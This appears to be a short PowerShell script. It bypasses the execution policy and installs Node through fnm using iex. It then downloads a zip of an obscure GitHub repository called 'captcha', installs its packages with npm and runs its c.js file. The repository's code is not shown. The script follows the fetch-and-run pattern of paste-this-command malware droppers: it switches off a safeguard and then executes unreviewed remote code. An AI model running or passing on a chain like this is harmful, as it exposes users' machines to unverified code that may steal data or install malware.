Set-ExecutionPolicy Bypass -Scope Process
curl -Lo f.zip https://github.com/Schniz/fnm/releases/latest/download/fnm-windows.zip
Expand-Archive f.zip .
.\fnm install --lts
.\fnm env|iex
curl -Lo r.zip https://github.com/rcaptch7/captcha/archive/refs/heads/main.zip
Expand-Archive r.zip .
cd captcha-main
npm i
node c.js